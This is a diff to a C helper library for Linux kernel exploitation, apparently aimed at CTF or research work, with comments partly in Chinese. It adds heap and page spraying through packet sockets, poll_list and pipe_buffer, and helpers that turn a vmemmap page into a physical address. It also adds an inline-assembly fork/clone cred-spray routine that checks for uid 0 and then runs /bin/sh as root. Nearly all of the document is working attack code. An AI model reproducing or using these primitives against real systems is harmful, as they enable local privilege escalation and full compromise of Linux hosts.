@@ -5,7 +5,7 @@
  */
 int sprayfd_child[2];
 int sprayfd_parent[2];
-int socketfds[INITIAL_PAGE_SPRAY];
+int socketfds[10*INITIAL_PAGE_SPRAY];
 unsigned long user_cs, user_ss, user_rflags, user_sp;
 unsigned long long int base_addr;
 void *(*prepare_kernel_cred)(uint64_t)KERNCALL;
@@ -47,12 +47,13 @@ void unshare_setup(uid_t uid, gid_t gid) {
     return;
 }
 
-void send_spray_cmd(enum spray_cmd cmd, int idx) {
+void send_spray_cmd(enum spray_cmd cmd, int idx, uint32_t order) {
     ipc_req_t req;
     int32_t result;
 
     req.cmd = cmd;
     req.idx = idx;
+    req.order = order;
     write(sprayfd_child[1], &req, sizeof(req));
     read(sprayfd_parent[0], &result, sizeof(result));
     assert(result == idx);
@@ -84,6 +85,8 @@ int alloc_pages_via_sock(uint32_t size, uint32_t n) {
     req.tp_frame_size = 4096;
     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
 
+    // printf("req.tp_block_size: %d\n", req.tp_block_size);
+
     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
         perror("setsockopt PACKET_TX_RING failed");
         exit(-1);
@@ -98,9 +101,10 @@ void spray_comm_handler() {
 
     do {
         read(sprayfd_child[0], &req, sizeof(req));
-        assert(req.idx < INITIAL_PAGE_SPRAY);
+        assert(req.idx < 10*INITIAL_PAGE_SPRAY);
         if (req.cmd == ALLOC_PAGE) {
-            socketfds[req.idx] = alloc_pages_via_sock(4096, 1);
+            assert(req.order < 10);
+            socketfds[req.idx] = alloc_pages_via_sock(4096*(1 << req.order), 1);
         } else if (req.cmd == FREE_PAGE) {
             close(socketfds[req.idx]);
         }
@@ -110,6 +114,7 @@ void spray_comm_handler() {
 }
 
 static void socket_spray_example() {
+    uint32_t order = 0;
     // for communicating with spraying in separate namespace via TX_RINGs
     pipe(sprayfd_child);
     pipe(sprayfd_parent);
@@ -122,12 +127,12 @@ static void socket_spray_example() {
 
     puts("Allocated all pages");
     for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
-        send_spray_cmd(ALLOC_PAGE, i);
+        send_spray_cmd(ALLOC_PAGE, i, order);
     }
 
     puts("Closed all odd pages");
     for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) {
-        send_spray_cmd(FREE_PAGE, i);
+        send_spray_cmd(FREE_PAGE, i, 0);
     }
 
     // TODO: get the freed odd pages back with our struct
@@ -138,7 +143,7 @@ static void socket_spray_example() {
 
     puts("Closed all even pages");
     for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) {
-        send_spray_cmd(FREE_PAGE, i);
+        send_spray_cmd(FREE_PAGE, i, 0);
     }
 }
 
@@ -480,6 +485,50 @@ void create_poll_thread(int id, size_t size, int timeout) {
     pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
 }
 
+void *alloc_poll_list_for_crosscache(void *args) {
+    struct pollfd *pfds;
+    int nfds, timeout, id, watch_fd;
+
+    id = ((struct t_args *)args)->id;
+    nfds = ((struct t_args *)args)->nfds;
+    timeout = ((struct t_args *)args)->timeout;
+    watch_fd = ((struct t_args *)args)->watch_fd;
+
+    pfds = calloc(nfds, sizeof(struct pollfd));
+
+    for (int i = 0; i < nfds; i++) {
+        pfds[i].fd = watch_fd;
+        pfds[i].events = POLLERR;
+    }
+
+    assign_thread_to_core(0);
+
+    pthread_mutex_lock(&mutex);
+    poll_threads++;
+    pthread_mutex_unlock(&mutex);
+
+    sleep(6);
+
+    printf("[Thread %d] Start polling...\n", id);
+    int ret = poll(pfds, nfds, timeout);
+    printf("[Thread %d] Polling complete: %d!\n", id, ret);
+}
+
+void create_poll_thread_for_crosscache(int id, size_t size, int timeout) {
+    struct t_args *args;
+
+    args = calloc(1, sizeof(struct t_args));
+
+    if (size > PAGE_SIZE) size = size - ((size / PAGE_SIZE) * sizeof(struct poll_list));
+
+    args->id = id;
+    args->nfds = NFDS(size);
+    args->timeout = timeout;
+    args->watch_fd = poll_watch_fd;
+
+    pthread_create(&poll_tid[id], 0, alloc_poll_list_for_crosscache, (void *)args);
+}
+
 void join_poll_threads(void) {
     for (int i = 0; i < poll_threads; i++) pthread_join(poll_tid[i], NULL);
 
@@ -534,4 +583,155 @@ void sendmsg_init(uint64_t n, uint64_t spray_size, uint64_t offset, uint64_t use
         sendmsg_msgs[i].msg_namelen = sizeof(socket_addr);
         register_userfault(sendmsg_mmaped_addrs[i] + 0x1000, PAGE_SIZE, (uint64_t)userfault_handler);
     }
+}
+
+
+/**
+ * @brief pipe_buffer 相关
+ * 
+ */
+
+
+
+int pipefds[PIPE_SPRAY_NUM][2];
+
+void extend_pipe_buffer(int idx, size_t size) {
+    int ret = fcntl(pipefds[idx][1], F_SETPIPE_SZ, size);
+    if (ret < 0) {
+        perror("[X] fcntl");
+        exit(1);
+    }
+}
+
+void spray_pipe() {
+    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
+        if (pipe(pipefds[i]) < 0) {
+            perror("[X] pipe");
+            exit(1);
+        }
+    }
+}
+
+/**
+ * @brief convert page to physic address
+ * 
+ */
+
+uint64_t virtual_base = 0xffff888000000000;
+uint64_t vmemmap_base = 0xffffea0000000000;
+
+uint64_t page_to_virtual(uint64_t page) {
+    uint64_t page_cnt = (page - vmemmap_base) / 0x40;
+    uint64_t virtual_addr = virtual_base + page_cnt * 0x1000;
+    return virtual_addr;
+}
+
+uint64_t page_to_physic(uint64_t page) {
+    return page_to_virtual(page) - virtual_base;
+}
+
+
+/**
+ * @brief fork spray cred 相关
+ * 
+ */
+
+__attribute__((naked)) pid_t __clone(uint64_t flags, void *dest)
+{
+    __asm__ __volatile__(
+        ".intel_syntax noprefix;\n"
+        "mov r15, rsi;\n"
+        "xor rsi, rsi;\n"
+        "xor rdx, rdx;\n"
+        "xor r10, r10;\n"
+        "xor r9, r9;\n"
+        "mov rax, 56;\n"
+        "syscall;\n"
+        "cmp rax, 0;\n"
+        "jl bad_end;\n"
+        "jg good_end;\n"
+        "jmp r15;\n"
+        "bad_end:\n"
+        "neg rax;\n"
+        "ret;\n"
+        "good_end:\n"
+        "ret;\n"
+        ".att_syntax prefix;\n"
+    );
+}
+
+int rootfd[2];
+struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
+char throwaway;
+char root[] = "root\n";
+char binsh[] = "/bin/sh\x00";
+char *args[] = {"/bin/sh", NULL};
+
+__attribute__((naked)) void check_and_wait()
+{
+    __asm__ __volatile__(
+        ".intel_syntax noprefix;\n"
+        "lea rax, [rootfd];\n"
+        "mov edi, dword ptr [rax];\n"
+        "lea rsi, [throwaway];\n"
+        "mov rdx, 1;\n"
+        "xor rax, rax;\n"
+        "syscall;\n"
+        "mov rax, 102;\n"
+        "syscall;\n"
+        "cmp rax, 0;\n"
+        "jne finish;\n"
+        "mov rdi, 1;\n"
+        "lea rsi, [root];\n"
+        "mov rdx, 5;\n"
+        "mov rax, 1;\n"
+        "syscall;\n"
+        "lea rdi, [binsh];\n"
+        "lea rsi, [args];\n"
+        "xor rdx, rdx;\n"
+        "mov rax, 59;\n"
+        "syscall;\n"
+        "finish:\n"
+        "lea rdi, [timer];\n"
+        "xor rsi, rsi;\n"
+        "mov rax, 35;\n"
+        "syscall;\n"
+        "ret;\n"
+        ".att_syntax prefix;\n"
+    );
+}
+
+int just_wait()
+{
+    sleep(1000000000);
+}
+
+void fork_spray_cred_example() {
+    pipe(rootfd);
+
+    for (int i = 0; i < 0x20; i++) {
+        pid_t result = fork();
+        if (!result)
+        {
+            just_wait();
+        }
+        if (result < 0)
+        {
+            puts("fork limit");
+            exit(-1);
+        }
+    }
+
+    // TODO: 页风水布局
+
+    for (int i = 0; i < 0x40; i++)
+    {
+        pid_t result = __clone(CLONE_FLAGS, &check_and_wait);
+        if (result < 0)
+        {
+            perror("clone error");
+            exit(-1);
+        }
+    }
+
 }
